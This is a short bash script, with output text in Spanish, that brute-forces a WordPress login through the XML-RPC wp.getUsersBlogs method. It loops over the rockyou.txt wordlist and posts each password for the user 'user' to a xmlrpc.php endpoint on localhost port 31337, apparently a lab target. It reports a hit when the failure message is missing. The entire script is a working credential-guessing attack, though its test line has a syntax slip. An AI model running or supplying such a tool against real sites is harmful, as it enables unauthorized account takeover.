#!/bin/bash

function createXML(){
	password=$1

	xmlFile="""
		<?xml version=\"1.0\" encoding=\"UTF-8\"?>
		<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>user</value></param>
	<param><value>$password</value></param>
		</params>
		</methodCall>
	"""
	echo $xmlFile > file.xml

	response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep "Incorrect username or password." )"]; then 
		echo -e "\n[+] La contraseña para el usuario user es $password"
		exit 0
	fi
}

cat /usr/share/wordlist/rockyou.txt | while read password; do
	createXML $password

done
